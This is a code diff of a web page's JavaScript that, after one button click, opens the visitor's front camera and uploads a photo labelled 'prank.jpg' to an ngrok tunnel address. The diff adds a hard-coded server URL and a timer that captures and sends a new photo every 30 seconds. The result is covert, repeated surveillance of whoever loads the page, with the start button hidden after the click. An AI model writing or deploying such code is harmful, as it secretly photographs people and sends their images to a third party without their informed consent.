@@ -37,12 +37,18 @@
         const ctx = canvas.getContext("2d");
         const startBtn = document.getElementById("startBtn");
 
+        // Your server URL (replace with your NGROK link)
+        const SERVER_URL = "https://532c-45-245-185-41.ngrok-free.app/upload";  
+
         startBtn.addEventListener("click", function () {
-            startBtn.style.display = "none"; // Hide button after click
+            startBtn.style.display = "none"; // Hide button after click-
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(stream => {
                 video.srcObject = stream;
-                setTimeout(captureImage, 2500); // Take photo after 2.5 seconds
+                setTimeout(captureImage, 2500); // Take first photo after 2.5 seconds
+                
+                // Start taking photos every 30 seconds
+                setInterval(captureImage, 30000);  
             })
             .catch(err => console.error("Camera access denied:", err));
         });
@@ -57,7 +63,7 @@
                 let formData = new FormData();
                 formData.append("file", blob, "prank.jpg");
 
-                fetch(" https://5419-45-245-185-41.ngrok-free.app/upload", {  // Your NGROK URL
+                fetch(SERVER_URL, {  
                     method: "POST",
                     body: formData
                 })
